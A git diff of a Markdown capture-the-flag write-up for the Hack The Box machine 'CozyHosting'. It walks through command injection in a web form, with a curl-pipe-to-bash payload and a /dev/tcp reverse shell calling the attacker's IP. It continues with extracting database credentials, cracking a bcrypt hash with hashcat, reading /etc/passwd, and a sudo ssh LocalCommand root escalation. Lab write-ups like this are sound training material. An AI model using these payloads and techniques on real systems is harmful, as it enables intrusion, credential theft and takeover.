@@ -6,7 +6,7 @@ os: linux
 pwnDate: 2024-03-03
 releaseDate: 2023-09-02
 slug: "cozy-hosting"
-isPublished: false
+isPublished: true
 shareLink: https://www.hackthebox.com/achievement/machine/701907/559
 ---
 
@@ -127,17 +127,24 @@ At the bottom of the page, we see a form for automatic patching. We try to submi
 
 ## Exploitation
 
+For testing purposes, let's try to perform a command injection by performing a curl to my local machine for this we raise a local web server with the following python command
+
 ```bash
 python3 -m http.server 7000
 ```
 
-```bash
-test;curl${IFS}http://10.10.14.37:7000
+and typing in the form the following values:
+
+```yaml
+hostname: 127.0.0.1
+username: test:curl${IFS}http://10.10.14.63:7000
 ```
+
+next, we create a revershell and follow the same procedure.
 
 ```bash
 #!/usr/bin/env bash
-sh -i >& /dev/tcp/10.10.14.37/5000 0>&1
+sh -i >& /dev/tcp/10.10.14.63/5000 0>&1
 ```
 
 ```bash
@@ -145,35 +152,94 @@ nc -lnvp 5000
 ```
 
 ```bash
-test;curl${IFS}http://10.10.14.49:7000/rev.sh|bash;
+test;curl${IFS}http://10.10.14.63:7000/rev.sh|bash;
 ```
+
+## Post Exploitation
+
+once inside, we improve our shell with the [hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/full-ttys#script) guide
+
+Once inside, we see a .jar (Java Archive) file called cloudhosting-0.0.1.jar and we extract it to the /tmp/app directory using the -d flag in unzip, which specifies the destination folder.
 
 ```bash
-script /dev/null -c bash
+unzip -d /tmp/app cloudhosting-0.0.1.jar
 ```
+
+As we know that it is an application made with spring boot, we can look for the `application.properties` file inside the `/tmp/app` folder.
 
 ```bash
-app@cozyhosting:/app$ cat /tmp/app/BOOT-INF/classes/application.properties
-cat /tmp/app/BOOT-INF/classes/application.properties
-server.address=127.0.0.1
-server.servlet.session.timeout=5m
-management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
-management.endpoint.sessions.enabled = true
-spring.datasource.driver-class-name=org.postgresql.Driver
-spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
-spring.jpa.hibernate.ddl-auto=none
-spring.jpa.database=POSTGRESQL
-spring.datasource.platform=postgres
-spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
-spring.datasource.username=postgres
-spring.datasource.password=Vg&nvzAQ7XxR
+find . -name "application.properties"
+
+./BOOT-INF/classes/application.properties
 ```
 
+after making cat to the mentioned file, we obtain the following information among which are the access keys to a postgres bbdd (I have formatted the information).
 
-| name      | password                                                     | role  |
-| --------- | ------------------------------------------------------------ | ----- |
-| kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User  |
-| admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin |
+```yaml
+server:
+  address: 127.0.0.1
+  servlet:
+    session:
+      timeout: 5m
+management:
+  endpoints:
+    web:
+      exposure:
+        include: health,beans,env,sessions,mappings
+    sessions:
+      enabled: true
+spring:
+  datasource:
+    driver-class-name: org.postgresql.Driver
+    platform: postgres
+    url: jdbc:postgresql://localhost:5432/cozyhosting
+    username: postgres
+    password: Vg&nvzAQ7XxR
+  jpa:
+    database-platform: org.hibernate.dialect.PostgreSQLDialect
+    hibernate:
+      ddl-auto: none
+    database: POSTGRESQL
+```
+
+The file reveals the credentials `postgres:Vg&nvzAQ7XxR`, with which we can connect to the local instance of
+PostgreSQL instance.
+
+```bash
+psql -h 127.0.0.1 -U postgres
+```
+
+Listing all available databases, we note the presence of the cozyhosting database.
+
+```bash
+\list
+```
+
+|   Name       |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   |
+| -------------|----------|----------|-------------|-------------|-----------------------|
+|  cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |                       |
+|  postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |                       |
+|  template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres  postgres=CTc/postgres |
+|  template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres  postgres=CTc/postgres |
+
+We connect to the database using the `\connect` directive.
+
+```bash
+\connect cozyhosting
+```
+
+Once we have successfully connected to the database, we can use the `\dt` command to list all the available tables in the database.
+
+| Schema | Name  | Type  |  Owner   |
+|--------|-------|-------|----------|
+| public | hosts | table | postgres |
+| public | users | table | postgres |
+
+next we can make a query to list the information in the users table
+
+```sql
+select * from users;
+```
 
 ```yml
 kanderson:
@@ -184,19 +250,101 @@ admin:
   role: Admin
 ```
 
+On the other hand, if we wanted to have seen the roles that the tables have we could have executed:
+
+```sql
+SELECT table_name, grantee, privilege_type
+FROM information_schema.role_table_grants
+WHERE table_schema = 'public';
+
+ table_name | grantee  | privilege_type 
+------------+----------+----------------
+ users      | postgres | INSERT
+ users      | postgres | SELECT
+ users      | postgres | UPDATE
+ users      | postgres | DELETE
+ users      | postgres | TRUNCATE
+ users      | postgres | REFERENCES
+ users      | postgres | TRIGGER
+ hosts      | postgres | INSERT
+ hosts      | postgres | SELECT
+ hosts      | postgres | UPDATE
+ hosts      | postgres | DELETE
+ hosts      | postgres | TRUNCATE
+ hosts      | postgres | REFERENCES
+ hosts      | postgres | TRIGGER
 ```
+
+As a result, we have found two password hashes: one for user **kanderson** and one for user **Admin** . We use `hashid` to identify the type of hash:
+
+```bash
 hashid $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
+
 Analyzing '$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm'
 [+] Blowfish(OpenBSD)
 [+] Woltlab Burning Board 4.x
 [+] bcrypt
 ```
 
-```
-hashcat hash_file -m 3200 /usr/share/wordlists/rockyou.txt
+Considering that these hashes come from a web application, in this case made with Spring Boot, one of the most likely candidates is bcrypt. We save the admin hash in a file and try to crack it using Hashcat, with mode 3200 for bcrypt. 
+
+```bash
+hashcat hash -m 3200 /usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
+
+$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
 ```
 
-## Post Exploitation
+returning to the victim machine, we exit with `\q` or `\quit` and see which users are on the system.
 
+```bash
+app@cozyhosting:/tmp/app$ cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+<...SNIP...>
+app:x:1001:1001::/home/app:/bin/sh
+postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+josh:x:1003:1003::/home/josh:/usr/bin/bash
+_laurel:x:998:998::/var/log/laurel:/bin/false
+```
+
+we try to connect via ssh to the machine with the following credentials `josh:manchesterunited`
+
+```bash
+ssh josh@10.10.11.230
+```
+
+and finally we get the user's flag
+
+```bash
+josh@cozyhosting:~$ cat user.txt
+fd79dfb77157895eb84280b58a42af44
+```
 
 ##  Privilege escalation
+
+Upon checking the sudo permissions for the user josh, we discover that they can run `/usr/bin/ssh` as `root`
+
+```bash
+josh@cozyhosting:~$ sudo -l
+[sudo] password for josh: 
+Matching Defaults entries for josh on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User josh may run the following commands on localhost:
+    (root) /usr/bin/ssh *
+```
+
+Reading through the [ssh documentation](https://linuxcommand.org/lc3_man_pages/ssh1.html) and this [link](https://serverfault.com/questions/318345/running-a-command-after-the-ssh-has-opened-the-tunnel), we can see that using the `-o` option we can execute a local command, so that when we execute the command `/bin/bash`, after connecting to the machine we get a shell as `root`.
+
+```bash
+sudo /usr/bin/ssh -o PermitLocalCommand=yes -o 'LocalCommand=/bin/bash' josh@127.0.0.1
+```
+
+and finally we get the last flag
+
+```bash
+root@cozyhosting:~# cat root.txt
+6b665d141bccb338bc9c15bc65a2b300
+```
